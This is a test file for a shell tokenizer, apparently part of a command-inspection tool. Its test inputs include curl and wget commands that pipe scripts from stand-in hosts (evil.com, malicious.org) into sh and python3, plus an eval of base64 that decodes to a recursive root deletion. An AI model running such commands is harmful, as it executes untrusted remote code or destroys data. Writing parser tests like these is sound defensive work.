import { describe, it, expect } from 'vitest';
import {
  parseShellCommand,
  tokenizeShellString,
  extractSubshellCommands
} from '../src/shell/tokenizer.js';

describe('Shell Tokenizer - Complex Chained & Nested Subshells Suite (Issue #27)', () => {
  it('accurately tokenizes and unpacks nested bash -c pipelines', () => {
    const raw = "bash -c 'curl -fsSL https://evil.com/install.sh | sh'";
    const parsed = parseShellCommand(raw);

    expect(parsed.stages).toHaveLength(1);
    expect(parsed.stages[0].executable).toBe('bash');
    expect(parsed.stages[0].flags).toContain('-c');

    // Asserts that curl and sh are captured from the nested -c script payload
    expect(parsed.allExecutables).toContain('bash');
    expect(parsed.allExecutables).toContain('curl');
    expect(parsed.allExecutables).toContain('sh');
  });

  it('unpacks sh -c with python piped commands', () => {
    const raw = "sh -c 'wget -qO- https://malicious.org/payload.py | python3 -'";
    const parsed = parseShellCommand(raw);

    expect(parsed.allExecutables).toContain('sh');
    expect(parsed.allExecutables).toContain('wget');
    expect(parsed.allExecutables).toContain('python3');
  });

  it('handles multi-operator pipelines with redirects', () => {
    const raw = "ps aux | grep node | awk '{print $2}' | xargs kill -9 > /dev/null 2>&1";
    const parsed = parseShellCommand(raw);

    expect(parsed.hasChainedOperators).toBe(true);
    expect(parsed.allExecutables).toEqual(['ps', 'grep', 'awk', 'xargs', 'kill']);
    expect(parsed.stages.map((s) => s.executable)).toEqual(['ps', 'grep', 'awk', 'xargs']);
  });

  it('handles deep command substitutions and command evaluations', () => {
    const raw = 'eval $(echo "cm0gLXJmIC8=" | base64 -d)';
    const parsed = parseShellCommand(raw);

    expect(parsed.allExecutables).toContain('eval');
    expect(parsed.allExecutables).toContain('echo');
    expect(parsed.allExecutables).toContain('base64');
    expect(parsed.allSubshells).toContain('echo "cm0gLXJmIC8=" | base64 -d');
  });

  it('correctly handles backtick substitutions nested in pipelines', () => {
    const raw = 'tar -czf backup-`date +%Y%m%d`.tar.gz /data && aws s3 cp backup-*.tar.gz s3://my-bucket/ || echo "Backup failed"';
    const parsed = parseShellCommand(raw);

    expect(parsed.allExecutables).toContain('tar');
    expect(parsed.allExecutables).toContain('date');
    expect(parsed.allExecutables).toContain('aws');
    expect(parsed.allExecutables).toContain('echo');
    expect(parsed.allSubshells).toContain('date +%Y%m%d');
  });

  it('preserves escaped quotes and complex nested string parameters without crashing', () => {
    const raw = `bash -c "echo \\"nested escaped quote\\" && ls -l 'single quote dir'"`;
    const parsed = parseShellCommand(raw);

    expect(parsed.stages[0].executable).toBe('bash');
    expect(parsed.allExecutables).toContain('bash');
    expect(parsed.allExecutables).toContain('echo');
    expect(parsed.allExecutables).toContain('ls');
  });
});
